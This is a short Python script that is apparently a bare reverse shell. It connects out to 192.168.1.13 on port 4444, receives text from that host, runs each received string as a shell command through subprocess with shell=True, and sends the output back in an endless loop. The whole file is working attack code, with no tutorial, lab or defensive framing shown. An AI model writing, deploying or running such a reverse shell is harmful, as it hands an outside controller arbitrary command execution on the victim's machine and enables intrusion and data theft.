import socket 
import subprocess

def shell(command):
	return subprocess.check_output(command, shell = True)

host = '192.168.1.13'
port = 4444

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))

while True:
	cmd_process = s.recv(1024)
	cmd_process = str(cmd_process, "cp866")
	#cms = cmd.decode()
	cmd_send = shell(cmd_process)
	s.send(cmd_send)
s.close()
